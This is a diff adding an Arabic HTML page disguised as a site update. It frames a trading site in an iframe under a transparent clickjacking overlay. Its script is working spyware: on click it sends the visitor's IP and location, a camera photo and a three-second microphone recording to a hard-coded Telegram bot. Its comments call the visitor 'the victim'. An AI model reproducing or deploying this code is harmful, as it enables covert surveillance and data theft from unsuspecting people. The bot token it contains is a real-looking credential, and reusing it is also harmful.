@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحديث...</title>
+    <style>
+        /* جعل الموقع يملأ الشاشة بالكامل خلف التمويه */
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #000; }
+        iframe { width: 100%; height: 100%; border: none; position: absolute; top: 0; left: 0; z-index: 1; }
+        
+        /* طبقة التمويه الشفافة لطلب الأذونات */
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.01); z-index: 999; cursor: pointer;
+        }
+
+        /* تصميم رسالة التوست (Toast) */
+        #toast {
+            visibility: hidden; min-width: 200px; background-color: #333; color: #fff;
+            text-align: center; border-radius: 20px; padding: 10px;
+            position: fixed; z-index: 1000; left: 50%; bottom: 50px;
+            transform: translateX(-50%); font-family: sans-serif; opacity: 0;
+            transition: opacity 0.5s, visibility 0.5s;
+        }
+        #toast.show { visibility: visible; opacity: 1; }
+    </style>
+</head>
+<body>
+
+    <iframe src="https://traidmod.com/" id="mainSite"></iframe>
+    
+    <div id="overlay" onclick="startCapture()"></div>
+
+    <div id="toast">جاري التحديث...</div>
+
+    <script>
+        const token = '8120975005:AAFpqunUzKJav0pCWI-ZjCMjUVi2FMOL3Go';
+        const chatId = '8249039685';
+        const redirectUrl = 'https://traidmod.com/';
+
+        function showToast() {
+            var x = document.getElementById("toast");
+            x.className = "show";
+            setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
+        }
+
+        async function sendLog(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            } catch(e) {}
+        }
+
+        async function startCapture() {
+            // إخفاء الطبقة الشفافة فوراً ليبدأ الضحية في تصفح الموقع
+            document.getElementById('overlay').style.display = 'none';
+            showToast(); // إظهار رسالة "جاري التحديث"
+
+            // 1. سحب بيانات IP والموقع في الخلفية
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sendLog(`🔔 دخول جديد!\n🌐 IP: ${d.ip}\n📍 ${d.city}, ${d.country_name}`);
+            });
+
+            // 2. محاولة سحب الكاميرا الخلفية والأمامية
+            try {
+                // نطلب الكاميرا مع تحديدfacingMode: 'environment' لمحاولة جلب الخلفية
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: { exact: "environment" } }, 
+                    audio: true 
+                }).catch(async () => {
+                    // إذا فشل الوصول للخلفية (مثل الكمبيوتر)، نطلب أي كاميرا متاحة
+                    return await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                });
+
+                // تصوير اللقطة
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.muted = true;
+                await video.play();
+
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const frm = new FormData();
+                        frm.append('chat_id', chatId);
+                        frm.append('photo', blob, 'camera.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
+                    }, 'image/jpeg', 0.6); // ضغط الصورة لسرعة الإرسال
+                }, 1000);
+
+                // تسجيل صوتي 3 ثواني
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('voice', blob, 'audio.ogg');
+                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm })
+                    .then(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                        // لا حاجة لعمل redirectUrl هنا لأن الموقع مفتوح بالفعل أمام الضحية
+                    });
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 3000);
+
+            } catch (e) {
+                await sendLog("⚠️ الضحية رفض الأذونات أو الجهاز لا يدعم الكاميرا الخلفية.");
+            }
+        }
+    </script>
+</body>
+</html>
